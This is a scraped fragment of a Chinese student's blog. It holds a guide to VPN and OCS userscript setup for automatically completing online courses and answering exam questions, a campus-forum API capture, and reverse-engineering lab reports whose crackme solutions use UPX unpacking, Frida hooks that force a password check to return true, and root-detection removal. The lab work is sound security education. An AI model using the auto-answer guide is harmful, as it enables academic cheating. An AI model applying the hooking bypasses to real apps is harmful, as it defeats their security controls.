客户端\n\n一个懂的百度的大脑（不是\n\n一双灵敏的眼睛（不是\n\n一个耐心看教程的好习惯（不是\n\n一颗真诚的心和  良好的态度 ，有问题 联系博主\n（实在懒得弄可以找我低价代刷\n\n\n开始操作有了这个工具，你不只是能进 ai，还可以高速浏览 GitHub 等网站，以及…………\n爬墙工具的介绍和安装使用如果你自己有梯子可以忽略这一步\n如果你自己有梯子可以忽略这一步\n如果你自己有梯子可以忽略这一步\n如果你自己有梯子可以忽略这一步\n工具介绍 这些你都不需要记，看看就行 \n​\t\t虚拟专用网络(Virtual Private Network，VPN)是专用网络的延伸，它包含了类似 Internet 的共享或公共网络链接。通过 VPN 可以以模拟点对点专用链接的方式通过共享或公共网络在两台计算机之间发送数据。\n　　如果说得再通俗一点，VPN 实际上是 “线路中的线路”，类型于城市大道上的 “公交专用线”，所不同的是，由 VPN 组成的 “线路” 并不是物理存在的，而是通过技术手段模拟出来，即是 “虚拟” 的。不过，这种虚拟的专用网络技术却可以在一条公用线路中为两台计算机建立一个逻辑上的专用 “通道”，它具有良好的保密和不受干扰性，使双方能进行自由而安全的点对点连接，因此被网络管理员们非常广泛地关注着。\n　　通过虚拟专用网，我们在家就可以轻松安全的登录到公司的内部网络上，这样可以实现我们在家办公的梦想了。\n账号注册微信搜索公众号关注：  W1ndys_Official  点击下方菜单 GPT 可获取注册地址\n\n输入邮箱密码注册账号，注册完成后登陆\n\n然后点击左侧购买订阅\n\n根据需求选择你合适的方案，如果你只是想尝鲜的话，毫无疑问，选最便宜的，能用就行\n\n我本人用的是  38.8 巨量不限时，推荐这个 ，大约可以用 2 年左右，平均下来大约 0.6&#x2F;天\n\n因为我不只有这一个需求，另外还有使用  ChatGPT，bingai  等的需求，所以这个是最划算的。\n\n另外关于如何使用 ChatGPT 的教程以后有时间我会写，OpenAI 官方的 ChatGPT\n买完之后点击左上方仪表盘可以看到你的已订阅\n\n然后点击仪表盘下方的使用文档\n\n选择你的系统安装客户端\n安装完之后登陆客户端就可以看到这样\n\n连接节点目前为止已经基本结束了，点击连接，点进去选个绿色的节点，点全局， 如果后续出现连接失败就换个节点 \n\n脚本安装首先安装脚本猫，点击进入 脚本猫使用文档\n\n根据自己浏览器选择安装，这里以 Google Chrome 为例\n（如果长时间进不去则需要  科学上网 ，由于种种原因这里不过多赘述）\n\n进来之后点击图示右上角安装（由于我已经安装过了所以图示是 remove）\n\n然后进入浏览器扩展中心可以看到已经安装好了，启用该扩展\n然后 进入 OCS 使用文档 下载 OCS 客户端\n（进去可能会让你下载视频，那个是操作教程，可看可不看，我会在后面写教程）\n\n下载之后安装，直接双击 exe 文件就行，没啥别的要动的\n下载完之后在桌面应该可以看到图标，双击图标打开\n\n进入软件后，一键初始化软件，选择浏览器，脚本管理器和脚本，点击安装。\n新建浏览器， 点击右侧蓝色按钮启动\n等待“OCS 导航页”页面加载完成后（可能会卡死，可重启或者直接刷新页面）进入任意网课平台即可，等待期间请勿操作浏览器。\n\n（更具体的教程和使用须知可以看软件内部自带的教程）\n\n点击新建浏览器，然后点击创建之后浏览器之后的小三角\n之后等待操作自动完成，可以看到可以刷题的网站\t\n\n然后点击智慧树知到（如果是刷学习通的话点学习通，这里不过多赘述）\n然后登录上自己的账号（其实不登录也行，主要是要配置题库）\n找到下面这个东西\n\n点击通用，点击全局设置\n根据自己需要进行下面配置\n\n点击进入题库管理平台\nocs 题库设置第一步：注册题库账号右上角注册，具体这个就不说了，只能用邮箱注册，之前用爱发电登录的请使用其他登录 爱发电授权登录 。\n第二步：登录题库，复制题库凭证登录后将会自动跳转到个人中心，每个人新注册账号可以获得 100 次免费搜题次数，找到 题库配置 , 最后点击复制。\n\n第三步：配置脚本题库在浏览器中打开你的网课， 进入学习，作业，考试页面，然后按照以下步骤配置：\n\n最后一步：刷新页面等待运行到自动答题章节后，查看搜题结果，如果搜索到了则为配置成功！\n注意\n如果次数使用完毕，进入个人中心购买次数即可\n收费项目归平台所有，与本人无关，酌情选择\n平台收费价格为 1 元&#x2F;100 次，3 元&#x2F;2000 次，10 元&#x2F;10000 次，50 元&#x2F;十万次\n\n刷课配置由于智慧树知到有习惯分，脚本提供了习惯刷课功能\n\n点击右上角 知到智慧树，点击 学习脚本\n\n根据喜好进行刷课即可，建议每天半小时，有习惯分\n展示由于我这学期没有智慧树平台的相关课程，各位自己偷偷刷吧\n用户协议\n使用本教程即代表同意此用户协议\n使用本教程所带来的后果均由用户个人承担\n本教程所涉及的消费均与本人无关\n本教程未经本人允许禁止转载\n不要跟我杠，杠就是你对\n我本人有 抑郁症 病史，玩过小红书，若本人遭受任何形式的网络暴力 (包括但不限于发送淫 &#x2F; 秽血 &#x2F; 腥图片，问候我家人), 并出现极端行为。一切都是 本人的错 和大家无关\n本教程旨在节省大家时间，让大家去做更有意义的事情，请勿用于违法用途，请勿倒卖，否则将追究法律责任\n 博主 W1ndys 享有最终解释权 \n\n","categories":["技术教程"],"tags":["智慧树知到","刷课脚本"]},{"title":"曲师大在校生论坛抓包分析","url":"/posts/7c3c27d6.html","content":"前言在校生论坛，野生平台，爬着玩玩推荐阅读：【微信小程序Burp+Proxifter抓包详细教程 - CSDN App】https://blog.csdn.net/CKT_GOD/article/details/134076065?sharetype=blog&amp;shareId=134076065&amp;sharerefer=APP&amp;sharesource=m0_73731989&amp;sharefrom=link\n请求包示例获取帖子详情\nGET /api/client/topics/1906634 HTTP/1.1Host: api.zxs-bbs.cnXweb_xhr: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x63090c11)XWEB/11581Authorization: Bearer ********************Tenant: 1Content-Type: application/jsonAccept: */*Sec-Fetch-Site: cross-siteSec-Fetch-Mode: corsSec-Fetch-Dest: emptyReferer: https://servicewechat.com/wx866b5984d70bdf22/61/page-frame.htmlAccept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Connection: keep-alive\n\n获取帖子评论\nGET /api/client/comments?topic_id=3106970&amp;sort=hot&amp;page=1 HTTP/1.1Host: api.zxs-bbs.cnXweb_xhr: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x63090c11)XWEB/11581Authorization: Bearer ********************Tenant: 1Content-Type: application/jsonAccept: */*Sec-Fetch-Site: cross-siteSec-Fetch-Mode: corsSec-Fetch-Dest: emptyReferer: https://servicewechat.com/wx866b5984d70bdf22/61/page-frame.htmlAccept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Connection: keep-alive\n\n获取十大热帖\nGET /api/client/topics/top?school=QFNU HTTP/1.1Host: api.zxs-bbs.cnXweb_xhr: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x63090c11)XWEB/11581Authorization: Bearer ********************Tenant: 1Content-Type: application/jsonAccept: */*Sec-Fetch-Site: cross-siteSec-Fetch-Mode: corsSec-Fetch-Dest: emptyReferer: https://servicewechat.com/wx866b5984d70bdf22/61/page-frame.htmlAccept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Connection: keep-alive\n","categories":["QFNU","在校生论坛"],"tags":["QFNU","在校生论坛","抓包","分析"]},{"title":"曲阜师范大学教务系统成绩监控（无需服务器）","url":"/posts/4fee17c4.html","content":"曲阜师范大学教务系统成绩监控点击链接加入群聊【Easy-QFNU ｜ 曲师大选课指北群】：https://qm.qq.com/q/xDrtQHMDNm点击链接加入群聊【Easy-QFNU ｜ 曲师大选课指北群 2】：https://qm.qq.com/q/Zw6GRHucim关注微信公众号获取更多内容\n\n曲阜师范大学教务系统成绩监控，检测到新有成绩出来之后会上报，利用 Github action 运行，无需服务器\n2025-01-17 更新了获取总学分总绩点，2024-2025-1 的学期绩点，依据学生手册的计算公式计算，精确到小数点后 15 位，先前版本如何更新： 点击 sync fork，再点击红色的按钮，自动初始化一次之后即可正常运行\n效果\n使用方法fork 项目W1ndys&#x2F;QFNUScoreReminder: 曲阜师范大学教务系统成绩监控，检测到新有成绩出来之后会上报\n点击链接进入 Github，fork 本项目到自己的仓库\n\n新增钉钉机器人去钉钉新建一个自己的群，去群设置 &gt; 机器人，添加一个自定义 webhook 机器人\n记录配置的 webhook 和 secret（不要泄露），如果你的 webhook 是 https://oapi.dingtalk.com/robot/send?access_token=xxx ，那么 DD_BOT_TOKEN 就是 xxx，DD_BOT_SECRET 就是 secret，下面要用\n\n新增飞书机器人（可选）访问飞书开放平台，创建一个自定义机器人。\n记录配置的 webhook 和 secret（不要泄露）。\nFEISHU_BOT_URL 就是 https://open.feishu.cn/open-apis/bot/v2/hook/xxxxxxx\nFEISHU_BOT_SECRET 就是验证关键词，自己自定义的\n配置环境变量进入设置配置环境变量\n\n分别配置 DD_BOT_SECRET 和 DD_BOT_TOKEN 、USER_ACCOUNT 和 USER_PASSWORD 环境变量\nDD_BOT_TOKEN 和 DD_BOT_SECRET 是钉钉机器人配置的 webhook 和 secret\nUSER_ACCOUNT 和 USER_PASSWORD 是教务系统账号密码\n运行进入 Actions 页面，点击 I understand my workflows,go ahead and enable them 按钮，然后点击左侧的 disable 按钮，再点击 enable workflows 按钮，然后点击 Run workflow 按钮，运行项目，如果配置正确，会收到钉钉消息\n\n收到钉钉消息，说明配置成功并且初始化成功\n到这里已经可以正常运行了，程序会每 5 分钟检查一次成绩，有新成绩会发送钉钉消息\n"},{"title":"月落乌啼算钱（斐波那契数列）","url":"/posts/28e75b42.html","content":"月落乌啼算钱（斐波那契数列）题目背景（本道题目木有隐藏歌曲……不用猜了……）\n《爱与愁的故事第一弹· heartache》最终章。\n吃完 pizza，月落乌啼知道超出自己的预算了。为了不在爱与愁大神面前献丑，只好还是硬着头皮去算钱……\n题目描述算完钱后，月落乌啼想着：“你坑我！”于是当爱与愁大神问多少钱时，月落乌啼说了一堆乱码。爱与愁大神说：“算了算了，我只问第 $n$ 样菜价格多少？”月落乌啼写出了：\n$$F_n&#x3D;\\dfrac{\\left(\\frac{1+\\sqrt{5}}{2}\\right)^n-\\left(\\frac{1-\\sqrt{5}}{2}\\right)^n}{\\sqrt{5}}$$\n由于爱与愁大神学过编程，于是就用 $1$ 分钟的时间求出了 $F_n$ 的结果。月落乌啼为此大吃一惊。你能学学爱与愁大神求出 $F_n$ 的值吗？\n输入格式一行一个自然数 $n$。\n输出格式只有 $1$ 行一个实数 $F_n$，保留两位小数。\n样例 #1样例输入 #16\n\n样例输出 #18.00\n\n提示对于所有数据：$0 \\leq n\\leq 48$。\n题解法一\nn = int(input())g5 = 5**0.5fn = ((((1 + g5) / 2) ** n) - (((1 - g5) / 2) ** n)) / g5print(&quot;%.2f&quot; % fn)\n\n法二\n由于题目给出提示了，斐波那契数列，直接写一个斐波那契数列就行了，实测也是这样的\n题解解释这段代码是用来计算斐波那契数列的第 n 个数字的近似值的。以下是代码的解释：\n\nn = int(input()): 用户输入一个整数 n，表示要计算斐波那契数列的第 n 个数字。\n\ng5 = 5**0.5: 这里定义了一个变量 g5，它是 5 的平方根，用于后面的计算。\n\nfn = ((((1 + g5) / 2) ** n) - (((1 - g5) / 2) ** n)) / g5: 这行代码计算了斐波那契数列的第 n 个数字的近似值。它使用了黄金比例和斐波那契数列的性质来进行计算。表达式中的部分是斐波那契数列的通项公式。\n\nprint(&quot;%.2f&quot; % fn): 最后，使用 print 函数将计算得到的近似值打印出来。&quot;%.2f&quot; 的格式化字符串表示将浮点数 fn 格式化为小数点后两位的浮点数，并打印出来。\n\n\n知识点小数保留几位的方法\nprint(&quot;%.2f&quot; % math)\n\n开根号的方法\na = b ** 0.5\n\n","categories":["Python","蓝桥"],"tags":["Python","蓝桥","洛谷"]},{"title":"本博客免责声明","url":"/posts/72e47f4f.html","content":"在使用本教程前，请务必阅读并理解以下内容。使用本教程即代表您同意以下用户协议：\n\n用户协议：使用本教程即表示您同意遵守本免责声明和用户协议。若您不同意此协议，请勿使用本教程提供的信息和指南。\n个人责任：本教程所提供的信息仅供参考，使用者需自行承担因使用产品A而产生的任何风险和后果。\n消费责任：使用本教程涉及的任何消费或购买行为与本人无关，用户需自行对其行为负责并承担相应风险。\n禁止转载：未经本人允许，严禁对本教程内容进行转载或再分发。任何未经授权的转载行为都将被视为侵权行为。\n结果不保证：本教程提供的建议和技巧并不能保证用户能够取得特定的结果或效果。实际使用中的成果可能因个人技能、环境差异或其他因素而有所不同。\n\n在使用本教程提供的信息前，请谨慎考虑个人能力和环境因素，并在必要时寻求专业建议。对于因使用本教程而产生的任何问题或损失，我们概不负责。\n","categories":["随笔"],"tags":["随笔"]},{"title":"本站浏览须知","url":"/posts/95d5a910.html","content":"📌 浏览须知\n欢迎访问本站，为了确保良好的浏览体验，请您了解以下事项：\n\n\n本站源站 IP 已迁移至阿里云服务器，大陆地区访问速度有保障。\n推荐使用 PC 端&#x2F;Pad 端等大屏设备浏览，以获得最佳阅读体验。\n本站所有文章均为原创，仅代表作者个人观点。\n本站内容仅供学习交流，不得转载或用于任何商业用途。\n\n\n🔐 隐私政策尊敬的用户：\n感谢您访问我们的网站。我们非常重视您的隐私保护和个人信息安全。请在使用我们的服务之前仔细阅读本隐私政策。\n信息收集与使用\n我们可能会收集您的部分个人信息，包括但不限于：IP 地址、浏览器类型、操作系统、访问时间、访问页面等信息。\n这些信息用于优化网站性能并提供更好的服务。\n我们承诺不会将您的个人信息用于其他目的，也不会与任何第三方共享（除非经您授权或法律要求）。\n\nCookie 和数据分析\n我们可能使用 Cookie 技术和第三方数据分析工具，收集和分析用户行为数据。\n这些数据仅用于统计分析和用户体验改善，不会涉及个人身份信息。\n\n网站内容\n本站包含原创内容和搬运内容（已标注出处）。\n原创内容保留版权所有权，禁止未经授权的转载或复制。\n搬运内容已尽可能注明出处，并尊重原作者的版权。\n\n51la 站点统计\n我们使用 51la 站点统计工具了解网站流量和访问情况。\n您的访问数据将被匿名化处理，仅用于网站分析和优化。\n\n\n⚠️ 免责声明网站加载速度虽然我们已迁移至阿里云服务器，但如果您仍遇到加载缓慢的情况，可能与您的网络环境有关。\n第三方链接本站可能包含指向第三方网站的链接，这些链接仅供参考和方便访问，我们不对第三方网站的内容和隐私政策负责。\n免责条款修改我们保留隐私政策和免责声明的修改权利。任何修改将在网站上公布，并在生效前提前通知用户。您继续使用我们的服务将视为接受修改后的条款。\n\n请您在使用我们的服务前仔细阅读并理解本隐私政策和免责声明。如有任何疑问或建议，欢迎随时联系我们。\n","categories":["随笔"],"tags":["随笔"]},{"title":"汇编语言与逆向工程实验报告1","url":"/posts/1c1a1773.html","content":"汇编语言与逆向工程实验报告 1\n","categories":["QFNU","汇编语言与逆向工程","实验报告"],"tags":["汇编语言","逆向工程","QFNU"]},{"title":"汇编语言与逆向工程实验报告10","url":"/posts/3dcbe5b0.html","content":"搭建实验环境安装 nasm 和 r2\nsudo apt install nasm\n\n\ngit clone https://github.com/radareorg/radare2.gitcd radare2sys/install.sh\n\n实验内容\n然后建立 zero.asm 文件。将编译好的程序输入\n\n对文件进行编译\n\n通过 r2 看到对应的汇编指令和二进制指令\n\n新建一个 pack.asm 文件，对刚刚的程序进行加壳操作将二进制指令加密。\n\n新建 pack_zero.asm 文件对刚刚加壳的程序进行脱壳，得到原始二进制指令。\n\n对文件进行编译。输入.&#x2F;pack_zero 111 脱壳成功。\n\n","categories":["QFNU","汇编语言与逆向工程","实验报告"],"tags":["汇编语言","逆向工程","QFNU"]},{"title":"汇编语言与逆向工程实验报告11","url":"/posts/4accd526.html","content":"查壳\n是 upx 工具的壳\n手动脱壳\nOD 打开\n\n\n定位到 PUSHAD\n\n\nESP 定律，下个断点\n\n\n找到 POPAD，找到入口点 OEP\n\n\nDump 出 exe 文件\n\n\n修补 IAT 表\n\n\n成功脱壳\n\n\n\n工具脱壳工具：UPX\n可以使用 upx -d xxx.exe 直接脱壳\n反汇编找到关键函数\n\n\n分析可得 flag: HappyNewYear!\n\n","categories":["QFNU","汇编语言与逆向工程","实验报告"],"tags":["汇编语言","逆向工程","QFNU"]},{"title":"汇编语言与逆向工程实验报告12","url":"/posts/d3c5849c.html","content":"VM 指令：0 1 dup 11 == 17 9 if jmp swap over + swap 1 + 2 jmp swap print\n\n\n\n地址\n0\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n指令\n0\n1\ndup\n11\n&#x3D;&#x3D;\n17\n9\nif\njmp\nswap\nover\n+\nswap\n1\n+\n2\njmp\nswap\nprint\n\n\n解释：\n压栈 0 1\n\ndup 复制栈顶元素\n\n11 &#x3D;&#x3D; 比较栈顶元素是否等于 11\n\n17 9 if 若栈顶元素等于 11，则跳转到第 17 行指令；否则跳转到第 9 行指令\n\njmp 无条件跳转\n\nswap 交换栈顶两个元素\n\nover 复制栈顶元素的上一个元素\n\n+ 相加栈顶两个元素\n\nswap 交换栈顶两个元素\n\n1 + 加 1\n\n2 jmp 无条件跳转\n\nprint 输出栈顶元素\n\n\n最终输出：55\n","categories":["QFNU","汇编语言与逆向工程","实验报告"],"tags":["汇编语言","逆向工程","QFNU"]},{"title":"汇编语言与逆向工程实验报告13","url":"/posts/a4c2b40a.html","content":"配置环境\n安卓模拟器上传 Frida-server\n\n\nWindows 连接安卓模拟器\n\n\n运行 Frida-server\n\n\n\nhook\n查看 PID\n\n\n连接进程\n\n\nhook 函数拿到 flag\n\n\n\nexpJava.perform(() =&gt; &#123;  const data = Java.use(&quot;net.persianov.crackme0x03.Data&quot;);  const f = data.isPasswordOk;  f.implementation = function (arg) &#123;    console.log(arg);    return true;  &#125;;&#125;);\n\nJava.perform(() =&gt; &#123;  const fg = Java.use(&quot;net.persianov.crackme0x03.FlagGuard&quot;);  console.log(fg);  console.log(fg.$new().generate());&#125;);\n","categories":["QFNU","汇编语言与逆向工程","实验报告"],"tags":["汇编语言","逆向工程","QFNU","安卓逆向","Frida"]},{"title":"汇编语言与逆向工程实验报告14","url":"/posts/3aa621a9.html","content":"\n成功启动设备的应用\n\n\n去除 root 检测\n\n\n静态分析flag\n\n\n\n","categories":["QFNU","汇编语言与逆向工程","实验报告"],"tags":["汇编语言","逆向工程","QFNU","安卓逆向","Frida"]},{"title":"汇编语言与逆向工程实验报告2","url":"/posts/851346c9.html","content":"汇编语言与逆向工程实验报告2查看编译后的 32bit 代码，比较与 64bit 的不同\n信息hello_32.o：     文件格式 elf32-i386hello_32.o：     文件格式 elf32-i386Disassembly of section .text:00000000 &lt;fun&gt;:   0:\t55                   \tpush   ebp   1:\t89 e5                \tmov    ebp,esp   3:\te8 fc ff ff ff       \tcall   4 &lt;fun+0x4&gt;   8:\t05 01 00 00 00       \tadd    eax,0x1   d:\t8b 55 08             \tmov    edx,DWORD PTR [ebp+0x8]  10:\t8b 45 0c             \tmov    eax,DWORD PTR [ebp+0xc]  13:\t01 d0                \tadd    eax,edx  15:\t5d                   \tpop    ebp  16:\tc3                   \tret    00000017 &lt;main&gt;:  17:\t8d 4c 24 04          \tlea    ecx,[esp+0x4]  1b:\t83 e4 f0             \tand    esp,0xfffffff0  1e:\tff 71 fc             \tpush   DWORD PTR [ecx-0x4]  21:\t55                   \tpush   ebp  22:\t89 e5                \tmov    ebp,esp  24:\t53                   \tpush   ebx  25:\t51                   \tpush   ecx  26:\t83 ec 10             \tsub    esp,0x10  29:\te8 fc ff ff ff       \tcall   2a &lt;main+0x13&gt;  2e:\t81 c3 02 00 00 00    \tadd    ebx,0x2  34:\t6a 04                \tpush   0x4  36:\t6a 03                \tpush   0x3  38:\te8 fc ff ff ff       \tcall   39 &lt;main+0x22&gt;  3d:\t83 c4 08             \tadd    esp,0x8  40:\t89 45 f4             \tmov    DWORD PTR [ebp-0xc],eax  43:\t83 ec 08             \tsub    esp,0x8  46:\tff 75 f4             \tpush   DWORD PTR [ebp-0xc]  49:\t8d 83 00 00 00 00    \tlea    eax,[ebx+0x0]  4f:\t50                   \tpush   eax  50:\te8 fc ff ff ff       \tcall   51 &lt;main+0x3a&gt;  55:\t83 c4 10             \tadd    esp,0x10  58:\tb8 00 00 00 00       \tmov    eax,0x0  5d:\t8d 65 f8             \tlea    esp,[ebp-0x8]  60:\t59                   \tpop    ecx  61:\t5b                   \tpop    ebx  62:\t5d                   \tpop    ebp  63:\t8d 61 fc             \tlea    esp,[ecx-0x4]  66:\tc3                   \tret    Disassembly of section .text.__x86.get_pc_thunk.ax:00000000 &lt;__x86.get_pc_thunk.ax&gt;:   0:\t8b 04 24             \tmov    eax,DWORD PTR [esp]   3:\tc3                   \tret    Disassembly of section .text.__x86.get_pc_thunk.bx:00000000 &lt;__x86.get_pc_thunk.bx&gt;:   0:\t8b 1c 24             \tmov    ebx,DWORD PTR [esp]   3:\tc3                   \tret    \n\nhello.o：     文件格式 elf64-x86-64hello.o：     文件格式 elf64-x86-64Disassembly of section .text:0000000000000000 &lt;fun&gt;:   0:\tf3 0f 1e fa          \tendbr64    4:\t55                   \tpush   rbp   5:\t48 89 e5             \tmov    rbp,rsp   8:\t89 7d fc             \tmov    DWORD PTR [rbp-0x4],edi   b:\t89 75 f8             \tmov    DWORD PTR [rbp-0x8],esi   e:\t8b 55 fc             \tmov    edx,DWORD PTR [rbp-0x4]  11:\t8b 45 f8             \tmov    eax,DWORD PTR [rbp-0x8]  14:\t01 d0                \tadd    eax,edx  16:\t5d                   \tpop    rbp  17:\tc3                   \tret    0000000000000018 &lt;main&gt;:  18:\tf3 0f 1e fa          \tendbr64   1c:\t55                   \tpush   rbp  1d:\t48 89 e5             \tmov    rbp,rsp  20:\t48 83 ec 10          \tsub    rsp,0x10  24:\tbe 04 00 00 00       \tmov    esi,0x4  29:\tbf 03 00 00 00       \tmov    edi,0x3  2e:\te8 00 00 00 00       \tcall   33 &lt;main+0x1b&gt;  33:\t89 45 fc             \tmov    DWORD PTR [rbp-0x4],eax  36:\t8b 45 fc             \tmov    eax,DWORD PTR [rbp-0x4]  39:\t89 c6                \tmov    esi,eax  3b:\t48 8d 05 00 00 00 00 \tlea    rax,[rip+0x0]        # 42 &lt;main+0x2a&gt;  42:\t48 89 c7             \tmov    rdi,rax  45:\tb8 00 00 00 00       \tmov    eax,0x0  4a:\te8 00 00 00 00       \tcall   4f &lt;main+0x37&gt;  4f:\tb8 00 00 00 00       \tmov    eax,0x0  54:\tc9                   \tleave    55:\tc3                   \tret    \n\n区别fun函数偏移地址不同，汇编指令不同一个是32位一个是64位\n\n32 位 x86 指令集。\n\n64 位 x86-64 指令集。\n\n32 位寄存器（如 eax、ebx、edx）。\n\n64 位寄存器（如 rax、rbx、rdx）。\n\n\n堆栈操作指令不同\npush pop\nmov  sub\n","categories":["QFNU","汇编语言与逆向工程","实验报告"],"tags":["汇编语言","逆向工程","QFNU"]},{"title":"汇编语言与逆向工程实验报告3","url":"/posts/f214765f.html","content":"汇编语言与逆向工程实验报告 3\n\n\n\n\n\n汇编指令\n解释\n\n\n\npush rbp\n将 rbp 寄存器的值压入栈中\n\n\nmov rbp, rsp\n将 rsp 寄存器的值复制到 rbp 寄存器中\n\n\nmov DWORD PTR [rbp-0x14], edi\n将 edi 寄存器的值移动到相对于 rbp 的地址偏移 -0x14 的内存位置\n\n\nmov DWORD PTR [rbp-0x18], esi\n将 esi 寄存器的值移动到相对于 rbp 的地址偏移 -0x18 的内存位置\n\n\nmov eax, DWORD PTR [rbp-0x14]\n将相对于 rbp 的地址偏移 -0x14 的内存位置的值复制到 eax 寄存器中\n\n\nmov DWORD PTR [rbp-0x8], eax\n将 eax 寄存器的值移动到相对于 rbp 的地址偏移 -0x8 的内存位置\n\n\nmov DWORD PTR [rbp-0x4], 0x0\n将值 0x0 移动到相对于 rbp 的地址偏移 -0x4 的内存位置\n\n\njmp 0x555555555150 &lt;fun+39&gt;\n无条件跳转到地址 0x555555555150\n\n\nmov eax, DWORD PTR [rbp-0x4]\n将相对于 rbp 的地址偏移 -0x4 的内存位置的值复制到 eax 寄存器中\n\n\nadd DWORD PTR [rbp-0x8], eax\n将 eax 寄存器的值与相对于 rbp 的地址偏移 -0x8 的内存位置的值相加，结果存储到 -0x8 的内存位置\n\n\nadd DWORD PTR [rbp-0x4], 0x1\n将值 0x1 加到相对于 rbp 的地址偏移 -0x4 的内存位置的值上\n\n\nmov eax, DWORD PTR [rbp-0x4]\n将相对于 rbp 的地址偏移 -0x4 的内存位置的值复制到 eax 寄存器中\n\n\ncmp eax, DWORD PTR [rbp-0x18]\n比较 eax 寄存器的值与相对于 rbp 的地址偏移 -0x18 的内存位置的值\n\n\njl 0x555555555146 &lt;fun+29&gt;\n如果前面的比较结果是小于，则跳转到地址 0x555555555146\n\n\nmov eax, DWORD PTR [rbp-0x8]\n将相对于 rbp 的地址偏移 -0x8 的内存位置的值复制到 eax 寄存器中\n\n\npop rbp\n将栈中压入的 rbp 寄存器的值弹出\n\n\n","categories":["QFNU","汇编语言与逆向工程","实验报告"],"tags":["汇编语言","逆向工程","QFNU"]},{"title":"汇编语言与逆向工程实验报告4","url":"/posts/6c70e3fc.html","content":"汇编语言与逆向工程实验报告 4\n实验目的：call，ret 堆栈，栈帧图\n\nhello_64.exe汇编\nfun 函数栈帧\n函数栈帧详解https://blog.csdn.net/qq_41412237/article/details/119489211#/\n\n\nendbr64: 可能是一个保留指令，用于指示 64 位代码段的开头。\n\npush rbp: 将当前栈底指针 rbp 的值压入栈中，准备建立栈帧。\n\nmov rbp, rsp: 设置栈底指针 rbp 的值为当前栈顶指针 rsp 的值，建立栈帧。\n\nsub rsp, 0x10: 分配 16 字节的空间给局部变量。\n\nmov esi, 4: 将立即数 4 移入寄存器 esi 中。\n\nmov edi, 3: 将立即数 3 移入寄存器 edi 中。\n\ncall hello_fun: 调用名为 hello_fun 的函数。\n\nmov [rbp-4], eax: 将函数返回值保存到栈帧中的位置。\n\nmov eax, [rbp-4]: 将之前保存在栈帧中的函数返回值移入 eax 寄存器。\n\nmov esi, eax: 将 eax 寄存器中的值移入 esi 寄存器。\n\nlea rax, [rel 0x6361e9cc0004]: 将相对地址 0x6361e9cc0004 加载到 rax 寄存器中。\n\nmov rdi, rax: 将 rax 中的值移入 rdi 寄存器。\n\nmov eax, 0: 将 0 移入 eax 寄存器。\n\ncall 0x6361e9cbf050: 调用地址 0x6361e9cbf050 处的函数。\n\nmov eax, 0: 将 0 移入 eax 寄存器。\n\nleave: 恢复栈帧。\n\nret: 返回。\n\n\nhello_32.exe汇编\nfun 函数栈帧根据提供的汇编代码，下面是对 fun 函数栈帧的分析：\n\npush ebp: 将旧的基址指针（ebp）压入栈中，保存调用函数前的堆栈帧。\n\nmov ebp, esp: 设置新的基址指针，将栈顶指针（esp）的值赋给 ebp，建立新的堆栈帧。\n\nsub esp, 0x10: 为局部变量分配空间，预留 16 字节的空间。这些空间将用于存储局部变量。\n\n在调用 hello32!fun 函数之前，我们没有看到其他的局部变量分配操作。因此，该函数可能只有少量的局部变量，而这些局部变量可以在前面的 sub esp, 0x10 中分配的空间内。\n\ncall hello32!fun: 调用了名为 hello32!fun 的函数，这是对应 fun 函数的调用。\n\nadd esp, 8: 调整栈指针，释放之前压入栈中的两个参数，这表明函数调用时传递了两个参数。\n\nmov [ebp-0xc], eax: 将 eax 寄存器中的值存储到基址指针（ebp）偏移 -0xc 处。这可能是 fun 函数的返回值（eax）被存储的位置。\n\nsub esp, 8: 为新的参数和调用准备空间。通常，这种指令用于为函数调用的参数分配空间。\n\npush dword [ebp-0xc]: 将基址指针（ebp）偏移 -0xc 处的值压入栈中，这很可能是为了将 fun 函数的返回值作为参数传递给后续的函数调用。\n\n\n\n\n","categories":["QFNU","汇编语言与逆向工程","实验报告"],"tags":["汇编语言","逆向工程","QFNU"]},{"title":"汇编语言与逆向工程实验报告6","url":"/posts/827e82d0.html","content":"汇编语言与逆向工程实验报告 6环境安装\ncrackme02 逆向undefined4 main(void)&#123;    int local_8;    printf(&quot;IOLI Crackme Level 0x02\\n&quot;);    printf(&quot;Password: &quot;);    scanf(&quot;%d&quot;, &amp;local_8);    if (local_8 == 0x52b24)    &#123;        printf(&quot;Password OK :)\\n&quot;);    &#125;    else    &#123;        printf(&quot;Invalid Password!\\n&quot;);    &#125;    return 0;&#125;\n\n通过分析伪代码得\n首先输出两句话，输入密码\n然后 if 判断，如果输入的内容与十六进制数 0x52b24 相等，则输出Password OK，否则输出 Invalid Password!\n所以密码就是0x52b24\n十六进制数为：0x52b24\n转换为二进制为：0b1010010101100100100\n转换为八进制为：0o1225444\n转换为十进制为：338724\ncrackme03 逆向主函数伪代码undefined4 main(void)&#123;  undefined4 local_8;  printf(&quot;IOLI Crackme Level 0x03\\n&quot;);  printf(&quot;Password: &quot;);  scanf(&quot;%d&quot;,&amp;local_8);  test(local_8,0x52b24);  return 0;&#125;\n\ntest 伪代码void test(int param_1,int param_2)&#123;  if (param_1 == param_2) &#123;    shift(&quot;Sdvvzrug#RN$$$#=,&quot;);  &#125;  else &#123;    shift(&quot;Lqydolg#Sdvvzrug$&quot;);  &#125;  return;&#125;\n\nshift1 伪代码titlevoid shift(char *param_1)&#123;  size_t sVar1;  uint local_80;  char local_7c [120];  local_80 = 0;  while( true ) &#123;    sVar1 = strlen(param_1);    if (sVar1 